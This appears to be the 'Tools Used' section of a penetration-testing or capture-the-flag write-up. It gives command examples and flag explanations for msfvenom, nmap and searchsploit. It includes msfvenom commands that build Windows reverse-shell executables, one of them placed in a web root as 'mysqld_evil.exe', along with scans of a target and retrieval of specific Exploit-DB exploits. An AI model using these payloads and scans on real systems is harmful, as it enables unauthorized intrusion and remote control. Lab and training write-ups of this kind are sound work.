## Tools Used

---

#### msfvenom

`Payload generation and encoding`

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > root/payload/reverse-shell
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > /var/www/html/mysqld_evil.exe
```

##### Usage:
`msfvenom -p payload LHOST=<Attacker's IP> LPORT=<port> -f format -o /output/path`

> -p, --payload
>> Payload that will be used.

> -f, --format
>> The payload's output format.

> -o, --out
>> Output path.

---

#### nmap
`Network discovery utility and port scanner`

```
nmap -p- $TARGET
```

```
nmap -sVC $TARGET -p 3389
```

```
nmap -sVC $TARGET -p 8021
```

##### Usage:
`nmap [options] targets`

>-p (port_range)
>> Defines which ports to scan. Accepts single ports, comma‑separated lists, ranges (e.g., 1–1024), or -p- for all ports.

>-sC
>> Runs the default script set (same as --script=default).

>-sV
>> Examines open ports to identify the service and version running on them.

---

#### searchploit
`Local command‑line interface for querying the Exploit‑DB archive`

```
searchploit -m 4779
```

```
searchploit -m 50448
```

##### Usage:
`searchsploit [options] <search_term>`

>-m, --mirror
>> Copies the chosen exploit file into your current directory for easier access or modification.

---
